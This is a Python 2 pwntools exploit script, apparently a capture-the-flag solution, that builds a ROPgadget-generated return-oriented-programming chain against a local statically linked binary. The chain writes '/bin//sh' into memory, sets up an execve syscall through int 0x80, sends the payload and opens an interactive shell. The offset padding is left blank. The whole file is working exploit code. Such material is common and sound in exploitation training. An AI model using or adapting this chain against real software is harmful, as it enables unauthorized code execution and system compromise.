#!/usr/bin/env python2
# execve generated by ROPgadget
from struct import pack
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./static')

io = process("./static")
print(io.recvuntil("most..."))

# Padding goes here
p = ''

p += pack(0x0806eb8b) # pop edx ; ret
p += pack(0x080da060) # @ .data
p += pack(0x080a8cb6) # pop eax ; ret
p += '/bin'
p += pack(0x08056c45) # mov dword ptr [edx], eax ; ret
p += pack(0x0806eb8b) # pop edx ; ret
p += pack(0x080da064) # @ .data + 4
p += pack(0x080a8cb6) # pop eax ; ret
p += '//sh'
p += pack(0x08056c45) # mov dword ptr [edx], eax ; ret
p += pack(0x0806eb8b) # pop edx ; ret
p += pack(0x080da068) # @ .data + 8
p += pack(0x08056200) # xor eax, eax ; ret
p += pack(0x08056c45) # mov dword ptr [edx], eax ; ret
p += pack(0x080481c9) # pop ebx ; ret
p += pack(0x080da060) # @ .data
p += pack(0x0806ebb2) # pop ecx ; pop ebx ; ret
p += pack(0x080da068) # @ .data + 8
p += pack(0x080da060) # padding without overwrite ebx
p += pack(0x0806eb8b) # pop edx ; ret
p += pack(0x080da068) # @ .data + 8
p += pack(0x08056200) # xor eax, eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x0807c01a) # inc eax ; ret
p += pack(0x08049533) # int 0x80

pay = p

print("pay: "+pay)
print("pay len: "+str(len(pay)))
print("=================sending pay===============")

io.sendline(pay)
io.interactive()
